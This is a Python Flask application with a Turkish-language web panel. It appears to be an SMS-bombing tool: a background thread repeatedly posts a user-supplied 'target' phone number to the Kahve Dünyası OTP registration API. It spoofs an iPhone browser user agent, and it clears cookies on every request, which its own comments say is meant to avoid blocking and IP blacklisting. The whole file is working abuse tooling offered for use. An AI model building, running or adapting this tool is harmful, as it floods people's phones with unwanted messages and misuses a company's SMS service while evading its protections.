import os
import time
import threading
import requests
from flask import Flask, render_template_string, request, redirect, url_for

app = Flask(__name__)

# Global sistem durumu
state = {
    "phone": "",
    "logs": [],
    "active": False,
    "sms_count": 0
}

def write_log(msg):
    tm = time.strftime('%H:%M:%S')
    state["logs"].insert(0, f"[{tm}] {msg}")
    if len(state["logs"]) > 50:
        state["logs"].pop()
    print(f">>> {tm} - {msg}", flush=True)

def worker():
    session = requests.Session()
    
    while True:
        if state["active"] and state["phone"]:
            # --- SADECE KAHVE DÜNYASI API ---
            url = "https://www.kahvedunyasi.com/api/v1/auth/register-otp"
            payload = {"mobile_number": state["phone"], "country_code": "90"}
            
            session.cookies.clear()  # 302/Engelleme riskini azaltmak için her istekte çerez temizliği
            
            headers = {
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Origin": "https://www.kahvedunyasi.com",
                "Referer": "https://www.kahvedunyasi.com/"
            }

            try:
                res = session.post(url, json=payload, headers=headers, timeout=15, allow_redirects=False)
                state["sms_count"] += 1
                
                if res.status_code in [200, 201]:
                    write_log(f"[{state['sms_count']}] Kahve Dünyası: BAŞARILI ✅")
                elif res.status_code == 302:
                    write_log(f"[{state['sms_count']}] Kahve Dünyası: Korumaya Takıldı (302) ⛔")
                else:
                    write_log(f"[{state['sms_count']}] Kahve Dünyası: Hata Kodu ({res.status_code})")
            except Exception as e:
                write_log("Kahve Dünyası: Bağlantı/Zaman Aşımı Hatası")
        
        # İstek aralığı (Saniye) - IP'nin hızlıca kara listeye düşmemesi için 120 saniye idealdir
        time.sleep(120)

# Arka plan motorunu başlatıyoruz
threading.Thread(target=worker, daemon=True).start()

# --- KOYU TEMA KAHVE DÜNYASI ARAYÜZÜ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kahve Dünyası OTP Motoru</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 40px 20px; }
        .container { width: 100%; max-width: 480px; }
        .header { text-align: center; margin-bottom: 25px; }
        .header h1 { font-size: 22px; font-weight: 700; color: #58a6ff; letter-spacing: 1px; }
        .header p { font-size: 13px; color: #8b949e; margin-top: 5px; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 25px; margin-bottom: 15px; }
        .card-title { font-size: 13px; font-weight: 600; color: #8b949e; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px; }
        .status-badge { display: inline-flex; align-items: center; gap: 8px; padding: 8px 14px; border-radius: 20px; font-size: 13px; font-weight: 600; margin-bottom: 15px; }
        .status-active { background: #1a4731; color: #3fb950; border: 1px solid #238636; }
        .status-waiting { background: #2d1f0e; color: #d29922; border: 1px solid #9e6a03; }
        .dot { width: 8px; height: 8px; border-radius: 50%; }
        .dot-green { background: #3fb950; animation: pulse 1.5s infinite; }
        .dot-yellow { background: #d29922; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
        input[type="text"] { width: 100%; padding: 12px 15px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; color: #c9d1d9; font-size: 15px; outline: none; transition: border-color 0.2s; margin-bottom: 12px; text-align: center; }
        input[type="text"]:focus { border-color: #58a6ff; }
        button { width: 48%; padding: 12px; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 15px; font-weight: 600; transition: background 0.2s; }
        .btn-start { background: #238636; }
        .btn-start:hover { background: #2ea043; }
        .btn-stop { background: #da3637; }
        .btn-stop:hover { background: #b62b2c; }
        .btn-container { display: flex; justify-content: space-between; }
        .stats { display: flex; gap: 10px; margin-bottom: 15px; }
        .stat-box { flex: 1; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 12px; text-align: center; }
        .stat-value { font-size: 22px; font-weight: 700; color: #58a6ff; }
        .stat-label { font-size: 11px; color: #8b949e; margin-top: 3px; }
        .log-box { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 15px; font-family: 'Courier New', Courier, monospace; font-size: 12px; line-height: 1.6; height: 220px; overflow-y: auto; color: #3fb950; }
        .log-entry { margin-bottom: 4px; }
        .log-entry.error { color: #f85149; }
        .footer { text-align: center; font-size: 11px; color: #484f58; margin-top: 10px; }
    </style>
    <script>setTimeout(() => { if (!document.querySelector('input:focus')) location.reload(); }, 15000);</script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>KAHVE DÜNYASI MOTORU</h1>
            <p>Sadece Tekli API Altyapısı</p>
        </div>
        <div class="card">
            <div class="card-title">Sistem Durumu</div>
            {% if active and phone %}
            <div class="status-badge status-active"><div class="dot dot-green"></div>AKTİF: +90 {{ phone }}</div>
            {% else %}
            <div class="status-badge status-waiting"><div class="dot dot-yellow"></div>NUMARA BEKLENİYOR</div>
            {% endif %}
            <div class="stats">
                <div class="stat-box"><div class="stat-value">{{ sms_count }}</div><div class="stat-label">Toplam İstek</div></div>
                <div class="stat-box"><div class="stat-value">2 Dk</div><div class="stat-label">Aralık Zamanı</div></div>
            </div>
        </div>
        <div class="card">
            <div class="card-title">Kontrol Paneli</div>
            <form method="POST">
                <input type="text" name="phone" placeholder="5XXXXXXXXX" maxlength="10" value="{{ phone }}">
                <div class="btn-container">
                    <button type="submit" name="action" value="start" class="btn-start">BAŞLAT</button>
                    <button type="submit" name="action" value="stop" class="btn-stop">DURDUR</button>
                </div>
            </form>
        </div>
        <div class="card">
            <div class="card-title">Canlı Sistem Günlükleri</div>
            <div class="log-box" id="logBox">
                {% for log in logs %}
                <div class="log-entry {% if 'Hata' in log or '302' in log %}error{% endif %}"> > {{ log }}</div>
                {% else %}
                <div style="color: #484f58;">Henüz işlem kaydı yok. Sistem hazır.</div>
                {% endfor %}
            </div>
        </div>
        <div class="footer">Sayfa her 15 saniyede bir otomatik yenilenir | Render Service</div>
    </div>
    <script>const lb = document.getElementById('logBox'); if (lb) lb.scrollTop = lb.scrollHeight;</script>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        action = request.form.get('action')
        if action == "start":
            p = request.form.get('phone', '').strip()
            if len(p) == 10 and p.isdigit():
                state["phone"] = p
                state["active"] = True
                write_log(f"Hedef ayarlandı: +90{p}")
        elif action == "stop":
            state["active"] = False
            write_log("Sistem kullanıcı tarafından durduruldu.")
        return redirect(url_for('index'))

    return render_template_string(
        HTML_TEMPLATE,
        phone=state["phone"],
        logs=state["logs"],
        active=state["active"],
        sms_count=state["sms_count"]
    )

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
